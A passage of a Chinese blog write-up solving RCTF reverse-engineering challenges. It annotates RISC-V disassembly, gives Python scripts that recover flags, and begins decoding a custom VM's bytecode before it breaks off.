class="built_in">cout</span> &lt;&lt; hex &lt;&lt; a &lt;&lt; b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RCTF{db824ef8605c5235b4bbacfa2ff8e087}</p><p>const和delta常量应该是开头某个的函数生成的，直接在调试过程中dump下来。</p><p>后面学习了一下密码算法，这是标准的blowfish算法，似乎当年是aes的备选算法之一。</p><h3><span id="asm">asm</span></h3><p>RISC-V架构。工具下载：<a href="https://github.com/riscv/riscv-gnu-toolchain" target="_blank" rel="noopener">**https://github.com/riscv/riscv-gnu-toolchain**</a></p><p>很大，慢慢下载。编译完总共3.6g...</p><p>指令手册没找到特别齐全的，官方的：http://crva.io/documents/RISC-V-Reader-Chinese-v2p1.pdf</p><p>讲的也不是特别细，没intel白皮书讲的那么详细，总之一条一条指令搜+连蒙带猜</p><p>用工具的objdump搞出汇编。一开始看到1w多行有点吓人，不过应该是静态编译的，所以很多都不用看。</p><p>先找主逻辑。strings一下发现有东西，能看到 flag plz 和%80s字符串。在010 editor中定位到字符串的位置在二进制文件的CF00处。结合反汇编的地址猜测偏移是0x10000，因此在寻找0x1cf00。刚好在0x101b6附近找到了0x1cf00的引用，以及0x1cf10的引用也找到了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">1017c:    000007b7            lui     a5,0x0</span><br><span class="line">10180:    00078793            mv      a5,a5</span><br><span class="line">10184:    cf99                beqz    a5,0x101a2</span><br><span class="line">10186:    0001f537            lui     a0,0x1f</span><br><span class="line">1018a:    1141                addi    sp,sp,-16</span><br><span class="line">1018c:    8c018593            addi    a1,gp,-1856</span><br><span class="line">10190:    b8850513            addi    a0,a0,-1144 # 0x1eb88</span><br><span class="line">10194:    e406                sd      ra,8(sp)</span><br><span class="line">10196:    00000097            auipc   ra,0x0</span><br><span class="line">1019a:    000000e7            jalr    zero # 0x0</span><br><span class="line">1019e:    60a2                ld      ra,8(sp)</span><br><span class="line">101a0:    0141                addi    sp,sp,16</span><br><span class="line">101a2:    f6fff06f            j       0x10110</span><br><span class="line">101a6:    df010113            addi    sp,sp,-528</span><br><span class="line">101aa:    20113423            sd      ra,520(sp)</span><br><span class="line">101ae:    20813023            sd      s0,512(sp)</span><br><span class="line">101b2:    0c00                addi    s0,sp,528</span><br><span class="line">101b4:    67f5                lui     a5,0x1d</span><br><span class="line">101b6:    f0078513            addi    a0,a5,-256 # 0x1cf00</span><br><span class="line">101ba:    31c000ef            jal     ra,0x104d6 //printf?</span><br><span class="line">101be:    f8040793            addi    a5,s0,-128</span><br><span class="line">101c2:    85be                mv      a1,a5</span><br><span class="line">101c4:    67f5                lui     a5,0x1d</span><br><span class="line">101c6:    f1078513            addi    a0,a5,-240 # 0x1cf10</span><br><span class="line">101ca:    316000ef            jal     ra,0x104e0 //scanf</span><br><span class="line">101ce:    f8040793            addi    a5,s0,-128 </span><br><span class="line">101d2:    853e                mv      a0,a5</span><br><span class="line">101d4:    358000ef            jal     ra,0x1052c //? scanf?</span><br><span class="line">101d8:    87aa                mv      a5,a0</span><br><span class="line">101da:    fef42423            sw      a5,-24(s0) //len?</span><br><span class="line">101de:    fe042623            sw      zero,-20(s0) // i</span><br><span class="line">101e2:    a041                j       0x10262</span><br><span class="line"></span><br><span class="line">101e4:    fec42783            lw      a5,-20(s0)</span><br><span class="line">101e8:    ff040713            addi    a4,s0,-16</span><br><span class="line">101ec:    97ba                add     a5,a5,a4</span><br><span class="line">101ee:    f907c703            lbu     a4,-112(a5)</span><br><span class="line">101f2:    fec42783            lw      a5,-20(s0)</span><br><span class="line">101f6:    2785                addiw   a5,a5,1</span><br><span class="line">101f8:    2781                sext.w  a5,a5</span><br><span class="line">101fa:    86be                mv      a3,a5</span><br><span class="line">101fc:    47fd                li      a5,31</span><br><span class="line">101fe:    02f6e7bb            remw    a5,a3,a5</span><br><span class="line">10202:    2781                sext.w  a5,a5</span><br><span class="line">10204:    ff040693            addi    a3,s0,-16</span><br><span class="line">10208:    97b6                add     a5,a5,a3</span><br><span class="line">1020a:    f907c783            lbu     a5,-112(a5)</span><br><span class="line">1020e:    8fb9                xor     a5,a5,a4</span><br><span class="line">10210:    0ff7f793            andi    a5,a5,255</span><br><span class="line">10214:    0007869b            sext.w  a3,a5</span><br><span class="line">10218:    fec42703            lw      a4,-20(s0)</span><br><span class="line">1021c:    87ba                mv      a5,a4     //a4 = i</span><br><span class="line">1021e:    0017979b            slliw   a5,a5,0x1 //</span><br><span class="line">10222:    9fb9                addw    a5,a5,a4  //</span><br><span class="line">10224:    0057979b            slliw   a5,a5,0x5</span><br><span class="line">10228:    9fb9                addw    a5,a5,a4  //((((i&lt;&lt;1)+i)&lt;&lt;5)+i)</span><br><span class="line">1022a:    2781                sext.w  a5,a5</span><br><span class="line">1022c:    873e                mv      a4,a5     // a4 = ((((i&lt;&lt;1)+i)&lt;&lt;5)+i)</span><br><span class="line">1022e:    41f7579b            sraiw   a5,a4,0x1f //((((i&lt;&lt;1)+i)&lt;&lt;5)+i)&gt;&gt;0x1f</span><br><span class="line">10232:    0187d79b            srliw   a5,a5,0x18 //((((((i&lt;&lt;1)+i)&lt;&lt;5)+i)&gt;&gt;0x1f)&lt;&lt;0x18)</span><br><span class="line">10236:    9f3d                addw    a4,a4,a5   //((((((((i&lt;&lt;1)+i)&lt;&lt;5)+i)&gt;&gt;0x1f)&lt;&lt;0x18)+((((i&lt;&lt;1)+i)&lt;&lt;5)+i))&amp;0xff)</span><br><span class="line">10238:    0ff77713            andi    a4,a4,255</span><br><span class="line">1023c:    40f707bb            subw    a5,a4,a5</span><br><span class="line">10240:    2781                sext.w  a5,a5</span><br><span class="line">10242:    8fb5                xor     a5,a5,a3</span><br><span class="line">10244:    0007871b            sext.w  a4,a5</span><br><span class="line">10248:    fec42783            lw      a5,-20(s0)</span><br><span class="line">1024c:    078a                slli    a5,a5,0x2 //i&lt;&lt;2</span><br><span class="line">1024e:    ff040693            addi    a3,s0,-16 </span><br><span class="line">10252:    97b6                add     a5,a5,a3    b[i&lt;&lt;2] = </span><br><span class="line">10254:    e0e7a023            sw      a4,-512(a5)</span><br><span class="line">10258:    fec42783            lw      a5,-20(s0)</span><br><span class="line">1025c:    2785                addiw   a5,a5,1</span><br><span class="line">1025e:    fef42623            sw      a5,-20(s0)</span><br><span class="line">10262:    fec42703            lw      a4,-20(s0)</span><br><span class="line">10266:    fe842783            lw      a5,-24(s0)</span><br><span class="line">1026a:    2701                sext.w  a4,a4</span><br><span class="line">1026c:    2781                sext.w  a5,a5</span><br><span class="line">1026e:    f6f74be3            blt     a4,a5,0x101e4</span><br><span class="line"></span><br><span class="line">10272:    fe042623            sw      zero,-20(s0) //i = 0</span><br><span class="line">10276:    a825                j       0x102ae      //</span><br><span class="line">10278:    fec42783            lw      a5,-20(s0)</span><br><span class="line">1027c:    078a                slli    a5,a5,0x2  //</span><br><span class="line">1027e:    ff040713            addi    a4,s0,-16</span><br><span class="line">10282:    97ba                add     a5,a5,a4</span><br><span class="line">10284:    e007a683            lw      a3,-512(a5) //b[i]</span><br><span class="line">10288:    0001f7b7            lui     a5,0x1f</span><br><span class="line">1028c:    fec42703            lw      a4,-20(s0)</span><br><span class="line">10290:    070a                slli    a4,a4,0x2</span><br><span class="line">10292:    ba078793            addi    a5,a5,-1120 # 0x1eba0 </span><br><span class="line">10296:    97ba                add     a5,a5,a4      //const[i]</span><br><span class="line">10298:    439c                lw      a5,0(a5)</span><br><span class="line">1029a:    8736                mv      a4,a3</span><br><span class="line">1029c:    00f70463            beq     a4,a5,0x102a4</span><br><span class="line">102a0:    4781                li      a5,0</span><br><span class="line">102a2:    a025                j       0x102ca</span><br><span class="line">102a4:    fec42783            lw      a5,-20(s0)</span><br><span class="line">102a8:    2785                addiw   a5,a5,1</span><br><span class="line">102aa:    fef42623            sw      a5,-20(s0)</span><br><span class="line">102ae:    fec42703            lw      a4,-20(s0)</span><br><span class="line">102b2:    fe842783            lw      a5,-24(s0)</span><br><span class="line">102b6:    2701                sext.w  a4,a4</span><br><span class="line">102b8:    2781                sext.w  a5,a5</span><br><span class="line">102ba:    faf74fe3            blt     a4,a5,0x10278</span><br><span class="line"></span><br><span class="line">102be:    67f5                lui     a5,0x1d</span><br><span class="line">102c0:    f1878513            addi    a0,a5,-232 # 0x1cf18</span><br><span class="line">102c4:    212000ef            jal     ra,0x104d6</span><br><span class="line">102c8:    4781                li      a5,0</span><br><span class="line">102ca:    853e                mv      a0,a5</span><br><span class="line">102cc:    20813083            ld      ra,520(sp)</span><br><span class="line">102d0:    20013403            ld      s0,512(sp)</span><br><span class="line">102d4:    21010113            addi    sp,sp,528</span><br><span class="line">102d8:    8082                ret</span><br></pre></td></tr></table></figure><p>主逻辑并不长，慢慢看不难发现是两个循环，第一个加密，第二个对比。</p><p>另外提一句，最终对比常量的地址0x1eba0（objdump生成的）有问题，附近找一下应该是0x1dba0，即二进制文件中0xdba0的地方。</p><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0x11</span>, <span class="number">0x76</span>, <span class="number">0xD0</span>, <span class="number">0x1E</span>, <span class="number">0x99</span>, <span class="number">0xB6</span>, <span class="number">0x2C</span>, <span class="number">0x91</span>, <span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0xFB</span>, <span class="number">0x2A</span>, <span class="number">0x97</span>, <span class="number">0xC6</span>, <span class="number">0x63</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0x7C</span>, <span class="number">0xE1</span>, <span class="number">0x1E</span>, <span class="number">0x83</span>, <span class="number">0xE6</span>, <span class="number">0x45</span>, <span class="number">0xA0</span>, <span class="number">0x19</span>, <span class="number">0x63</span>, <span class="number">0xDD</span>, <span class="number">0x32</span>, <span class="number">0xA4</span>, <span class="number">0xDF</span>, <span class="number">0x71</span>]</span><br><span class="line">plain = [ord(<span class="string">'R'</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">   plain.append(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">   plain[i+<span class="number">1</span>] = cipher[i]^plain[i]^(((((((((i&lt;&lt;<span class="number">1</span>)+i)&lt;&lt;<span class="number">5</span>)+i)&gt;&gt;<span class="number">0x1f</span>)&lt;&lt;<span class="number">0x18</span>)+((((i&lt;&lt;<span class="number">1</span>)+i)&lt;&lt;<span class="number">5</span>)+i))&amp;<span class="number">0xff</span>)-((((((i&lt;&lt;<span class="number">1</span>)+i)&lt;&lt;<span class="number">5</span>)+i)&gt;&gt;<span class="number">0x1f</span>)&lt;&lt;<span class="number">0x18</span>))</span><br><span class="line">print(<span class="string">''</span>.join(map(chr,plain)))</span><br></pre></td></tr></table></figure><p>flag很秀：</p><p>RCTF{f5_is_not_real_reversing_}</p><p>所以真正的逆向应该是对着机器码逆向。</p><h3><span id="crack">crack</span></h3><p>通过字符串查找引用很容易找到主逻辑在sub_4025E0。</p><p>算法本质是这个问题：</p><p><a href="https://projecteuler.net/problem=18" class="uri" target="_blank" rel="noopener">https://projecteuler.net/problem=18</a></p><p><a href="https://projecteuler.net/problem=67" class="uri" target="_blank" rel="noopener">https://projecteuler.net/problem=67</a></p><p>总共有0x200*0x200行数据，每行的前n个元素是金字塔中对应元素，其余的元素根据输入的过程拼接起来变成一个函数，在00402762会被调用。</p><p>相加总和要为0x100758E540F。其实如果他没说这时最大值还真不好算。知道是要算最大值就好办了，可以用简单的动态规划来求出结果与过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line">f = open(<span class="string">'data.mem'</span>,<span class="string">'rb'</span>)</span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x200</span>):</span><br><span class="line">   tmp = []</span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x200</span>):</span><br><span class="line">       i1 = ord(f.read(<span class="number">1</span>))</span><br><span class="line">       i2 = ord(f.read(<span class="number">1</span>))</span><br><span class="line">       i3 = ord(f.read(<span class="number">1</span>))</span><br><span class="line">       i4 = ord(f.read(<span class="number">1</span>))</span><br><span class="line">       tmp.append((i4&lt;&lt;<span class="number">24</span>)+(i3&lt;&lt;<span class="number">16</span>)+(i2&lt;&lt;<span class="number">8</span>)+i1)</span><br><span class="line">   data.append(tmp)</span><br><span class="line">A = deepcopy(data)</span><br><span class="line">B = [<span class="string">''</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(A)<span class="number">-1</span>)[::<span class="number">-1</span>]:</span><br><span class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>):</span><br><span class="line">       <span class="keyword">if</span> A[i+<span class="number">1</span>][j]&gt;A[i+<span class="number">1</span>][j+<span class="number">1</span>]:</span><br><span class="line">           A[i][j]+=A[i+<span class="number">1</span>][j]</span><br><span class="line">           B[i] += <span class="string">'0'</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           A[i][j]+=A[i+<span class="number">1</span>][j+<span class="number">1</span>]</span><br><span class="line">           B[i] += <span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">print(hex(A[<span class="number">0</span>][<span class="number">0</span>]))</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line">res = <span class="string">'0'</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x1FF</span>):</span><br><span class="line">   res+=B[x][y]</span><br><span class="line">   <span class="keyword">if</span> B[x][y]==<span class="string">'1'</span>:</span><br><span class="line">       y+=<span class="number">1</span></span><br><span class="line">print(res)</span><br><span class="line">print(len(res))</span><br></pre></td></tr></table></figure><p>得到512位的结果：</p><pp><p>到这里还没完，进入第二部分。把之前生成的函数dump下来，分析一遍发现是个vm。bytecode就是搜字符串时的一大堆的一大堆01。实际上他把bytecode转成了六位二进制数。</p><p>写了个脚本解析了opcode:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="stringspan></span><br><span class="line">codes = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;len(code)):</span><br><span class="line">   op = eval(<span class="string">'0b'</span>+code[i:i+<span class="number">6</span>][::<span class="number">-1</span>])</span><br><span class="line">   i+=<span class="number">6</span></span><br><span class="line">   <span class="keyword">if</span> op == <span class="number">0</span>:</span><br><span class="line">       num = eval(<span class="string">'0b'</span>+code[i:i+<span class="number">24</span>][::<span class="number">-1</span>])</span><br><span class="line">       print(<span class="string">'mov r0, 0x%x'</span>%num)</span><br><span class="line">       i+=<span class="number">24</span></span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">1</span>:</span><br><span class="line">       num = eval(<span class="string">'0b'</span>+code[i:i+<span class="number">24</span>][::<span class="number">-1</span>])</span><br><span class="line">       print(<span class="string">'mov r1, 0x%x'</span>%num)</span><br><span class="line">       i+=<span class="number">24</span></span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">       print(<span class="string">'mov r0, input[%d]'</span>%j)</span><br><span class="line">       j+=<span class="number">1</span></span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">3</span>:</span><br><span class="line">       print(<span class="string">'mov r1, r0'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">4</span>:</span><br><span class="line">       print(<span class="string">'mov r3, r2'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">5</span>:</span><br><span class="line">       print(<span class="string">'if r0&lt;128:'</span>)</span><br><span class="line">       print(<span class="string">'    r[r0] = r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">6</span>:</span><br><span class="line">       print(<span class="string">'if r1&lt;128:'</span>)</span><br><span class="line">       print(<span class="string">'    r0 = r[r1]'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">7</span>:</span><br><span class="line">       print(<span class="string">'if r2&lt;128:'</span>)</span><br><span class="line">       print(<span class="string">'    r[r2] = r3'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">8</span>:</span><br><span class="line">       print(<span class="string">'if r3&lt;128:'</span>)</span><br><span class="line">       print(<span class="string">'    r2 = r[r3]'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0xB</span>:</span><br><span class="line">       print(<span class="string">'add r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0xC</span>:</span><br><span class="line">       print(<span class="string">'sub r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0xD</span>:</span><br><span class="line">       print(<span class="string">'mul r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0xE</span>:</span><br><span class="line">       print(<span class="string">'div r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0xF</span>:</span><br><span class="line">       print(<span class="string">'and r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x10</span>:</span><br><span class="line">       print(<span class="string">'or r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x11</span>:</span><br><span class="line">       print(<span class="string">'xor r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x12</span>:</span><br><span class="line">       print(<span class="string">'shl r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x13</span>:</span><br><span class="line">       print(<span class="string">'shr r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x14</span>:</span><br><span class="line">       print(<span class="string">'grate r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x15</span>:</span><br><span class="line">       print(<span class="string">'below r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x16</span>:</span><br><span class="line">       print(<span class="string">'equl r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x17</span>:</span><br><span class="line">       print(<span class="string">'nequl r0, r1'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x18</span>:</span><br><span class="line">       print(<span class="string">'mov r0, ip'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x19</span>:</span><br><span class="line">       print(<span class="string">'mov ip, r0'</span>)</span><br><span class="line">   <span class="keyword">elif</span> op == <span class="number">0x1A</span>:</span><br><span class="line">       print(<span class="string">'cmp r0, 0'</span>)</span><br><span class="line">       print(<span class="string">'je  r1'</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       print(<span class="string">'?'</span>)</span><br></pre></td></tr></table></figure><p>没有按照汇编标准写，因为里面有些if不知道干嘛的，可能是混淆。个别opcode也没搞懂是做什么的。</p><p>伪代码（未完成）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span 